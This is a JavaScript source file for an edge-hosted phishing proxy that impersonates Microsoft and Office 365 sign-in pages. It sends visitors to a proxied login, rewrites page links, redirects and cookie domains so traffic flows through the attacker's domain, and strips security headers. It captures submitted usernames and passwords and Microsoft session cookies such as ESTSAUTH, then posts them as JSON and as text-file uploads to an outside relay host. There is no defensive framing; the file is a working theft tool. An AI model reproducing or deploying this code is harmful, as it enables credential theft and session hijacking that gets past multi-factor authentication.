export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// All domains that should be proxied
const PROXY_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com', 
  'account.live.com',
  'account.microsoft.com',
  'aadcdn.msauth.net',
  'www.office.com',
  'office.com'
];

// For detecting auth cookies
const AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'];

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

// ==================== URL PARSING ====================
function parseProxiedUrl(pathname) {
  // Check if this is a proxied request: /_p/domain/path
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const slashIndex = withoutPrefix.indexOf('/');
    
    let domain, path;
    
    if (slashIndex === -1) {
      domain = withoutPrefix;
      path = '/';
    } else {
      domain = withoutPrefix.substring(0, slashIndex);
      path = withoutPrefix.substring(slashIndex);
    }
    
    // Only proxy if domain is in our list
    if (PROXY_DOMAINS.includes(domain)) {
      return { domain, path, isProxied: true };
    }
  }
  
  return { domain: null, path: pathname, isProxied: false };
}

function shouldProxyDomain(hostname) {
  return PROXY_DOMAINS.includes(hostname);
}

function rewriteLocation(location, currentDomain) {
  if (!location) return location;
  
  try {
    // Handle relative redirects
    if (location.startsWith('/')) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentDomain}${location}`;
    }
    
    const url = new URL(location);
    
    // If redirecting to a domain we proxy, rewrite it
    if (shouldProxyDomain(url.hostname)) {
      // Clean any path parameters from the URL
      let cleanSearch = url.search;
      if (cleanSearch) {
        const params = new URLSearchParams(cleanSearch);
        let hasPathParams = false;
        for (const key of params.keys()) {
          if (key === 'path') {
            params.delete(key);
            hasPathParams = true;
          }
        }
        if (hasPathParams) {
          cleanSearch = params.toString();
          cleanSearch = cleanSearch ? '?' + cleanSearch : '';
        }
      }
      
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}${url.hash}`;
    }
    
    // Don't proxy external domains (like Microsoft's telemetry)
    return location;
  } catch (e) {
    return location;
  }
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    // Try form-urlencoded (Microsoft login)
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username') || params.get('Email');
    pass = params.get('passwd') || params.get('password') || params.get('Password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

function hasAuthCookies(cookieStr) {
  if (!cookieStr) return false;
  const lower = cookieStr.toLowerCase();
  return AUTH_COOKIES.some(cookie => lower.includes(cookie.toLowerCase()));
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  // Parse the request URL
  const { domain: targetDomain, path: targetPath, isProxied } = parseProxiedUrl(url.pathname);
  
  // Handle non-proxied requests - redirect to office.com through our proxy
  if (!isProxied || !targetDomain) {
    // Redirect to office.com/login through our proxy
    const redirectUrl = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com/login`;
    console.log(`[REDIRECT] Root -> ${redirectUrl}`);
    return new Response(null, {
      status: 302,
      headers: {
        'Location': redirectUrl,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Credentials': 'true'
      }
    });
  }

  // Build the upstream URL - IMPORTANT: preserve the original query string AS IS
  // Do NOT modify the query string - let Microsoft handle it
  const upstreamUrl = `https://${targetDomain}${targetPath}${url.search}`;
  
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  // Handle OPTIONS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Cookie, Set-Cookie',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build request headers
  const headers = new Headers();
  
  // Copy relevant headers
  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'cookie'];
  for (const h of headersToCopy) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }
  
  headers.set('Host', targetDomain);
  
  // Set referer if missing
  if (!headers.has('referer')) {
    headers.set('Referer', `https://${targetDomain}/`);
  }
  
  // Remove problematic headers
  headers.delete('content-length');
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let requestBody = null;
  let credentialsCaptured = false;

  // Handle POST requests for credentials
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user}`);
        credentialsCaptured = true;
        await sendToVercel('credentials', { 
          ip, user, pass, url: url.href 
        });
        
        const formData = new FormData();
        formData.append("file", new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: "POST", body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const response = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: requestBody,
      redirect: 'manual'
    });
    
    // Handle redirects
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      const location = response.headers.get('Location');
      const rewrittenLocation = rewriteLocation(location, targetDomain);
      console.log(`[REDIRECT] ${response.status} ${location} -> ${rewrittenLocation}`);
      
      const redirectHeaders = new Headers();
      redirectHeaders.set('Location', rewrittenLocation);
      redirectHeaders.set('Access-Control-Allow-Origin', '*');
      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
      
      return new Response(null, {
        status: response.status,
        headers: redirectHeaders
      });
    }
    
    // Build response headers
    const responseHeaders = new Headers();
    
    // Copy essential response headers
    const headersToCopyResponse = ['content-type', 'content-length', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
    for (const h of headersToCopyResponse) {
      const val = response.headers.get(h);
      if (val) responseHeaders.set(h, val);
    }
    
    // Remove security headers that cause issues
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    responseHeaders.delete('strict-transport-security');
    
    // Add CORS headers
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    
    // Process cookies
    const cookies = response.headers.getSetCookie?.() || [];
    let cookieStr = '';
    
    if (cookies.length) {
      cookieStr = cookies.join('; ');
      const hasAuth = hasAuthCookies(cookieStr);
      
      if (hasAuth) {
        console.log(`[AUTH COOKIES] Found auth cookies`);
        await exfiltrateCookies(cookieStr, ip, url.href);
      }
      
      // Process each cookie - only replace the domain
      for (const cookie of cookies) {
        if (!cookie) continue;
        let modifiedCookie = cookie;
        
        // Replace the target domain with our domain
        modifiedCookie = modifiedCookie.replace(
          new RegExp(targetDomain.replace(/\./g, '\\.'), 'g'),
          YOUR_DOMAIN
        );
        
        // Also handle cookies with leading dot
        modifiedCookie = modifiedCookie.replace(
          new RegExp('\\.' + targetDomain.replace(/\./g, '\\.'), 'g'),
          '.' + YOUR_DOMAIN
        );
        
        responseHeaders.append('Set-Cookie', modifiedCookie);
      }
    }
    
    // Process response body for HTML/JS/CSS
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || 
        contentType.includes('javascript') || 
        contentType.includes('json') || 
        contentType.includes('css')) {
      
      let text = await response.text();
      
      // Replace all proxy domains with our proxied URLs
      for (const domain of PROXY_DOMAINS) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      }
      
      // Fix relative URLs
      text = text.replace(/(src|href)="\/(?!_p\/)/g, `$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      text = text.replace(/(src|href)='\/(?!_p\/)/g, `$1='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      
      // Fix form actions
      text = text.replace(/action="\/(?!_p\/)/g, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      text = text.replace(/action='\/(?!_p\/)/g, `action='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    // Return binary content as-is
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
